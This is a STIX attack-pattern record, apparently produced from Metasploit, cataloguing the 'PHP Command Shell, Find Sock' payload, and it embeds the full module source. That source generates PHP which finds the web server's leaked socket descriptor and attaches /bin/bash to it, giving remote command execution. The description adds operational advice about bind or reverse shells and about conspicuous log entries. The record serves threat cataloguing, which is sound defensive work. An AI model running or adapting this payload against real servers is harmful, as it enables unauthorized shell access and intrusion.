{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35e75ea7-1e27-47df-b2f7-646acb1c14a1",
    "created": "2024-08-14T16:33:19.288613Z",
    "modified": "2024-08-14T16:33:19.288616Z",
    "name": "PHP Command Shell, Find Sock",
    "description": "Q Spawn a shell on the established connection to the webserver.  Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless firewalls prevent them from working.  The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions.  Only tested on Apache but it might work on other web servers that leak file descriptors to child processes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/shell_findsock.rb",
            "external_id": "shell_findsock.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Php\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'PHP Command Shell, Find Sock',\n      'Description'   => %Q{\n        Spawn a shell on the established connection to\n        the webserver.  Unfortunately, this payload\n        can leave conspicuous evil-looking entries in the\n        apache error logs, so it is probably a good idea\n        to use a bind or reverse shell unless firewalls\n        prevent them from working.  The issue this\n        payload takes advantage of (CLOEXEC flag not set\n        on sockets) appears to have been patched on the\n        Ubuntu version of Apache and may not work on\n        other Debian-based distributions.  Only tested on\n        Apache but it might work on other web servers\n        that leak file descriptors to child processes.\n        },\n      'Author'        => [ 'egypt' ],\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'php',\n      'Handler'       => Msf::Handler::FindShell,\n      'Session'       => Msf::Sessions::CommandShell,\n      'Arch'          => ARCH_PHP\n      ))\n  end\n\n  def php_findsock\n\n    var_cmd = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)\n    var_fd  = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)\n    var_out = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)\n    shell = <<END_OF_PHP_CODE\n#{php_preamble}\nprint(\"<html><body>\");\nflush();\n\nfunction mysystem(#{var_cmd}){\n  #{php_system_block(cmd_varname: var_cmd, output_varname: var_out)}\n  return #{var_out};\n}\n\n#{var_fd} = 13;\nfor ($i = 3; $i < 50; $i++) {\n  $foo = mysystem(\"/bin/bash 2>/dev/null <&$i -c 'echo $i'\");\n  if ($foo != $i) {\n    #{var_fd} = $i - 1;\n    break;\n  }\n}\nprint(\"</body></html>\\n\\n\");\nflush();\n\n#{var_cmd} = \"/bin/bash <&#{var_fd} >&#{var_fd} 2>&#{var_fd}\";\nmysystem(#{var_cmd});\n\nEND_OF_PHP_CODE\n\n\n    return shell\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return php_findsock\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}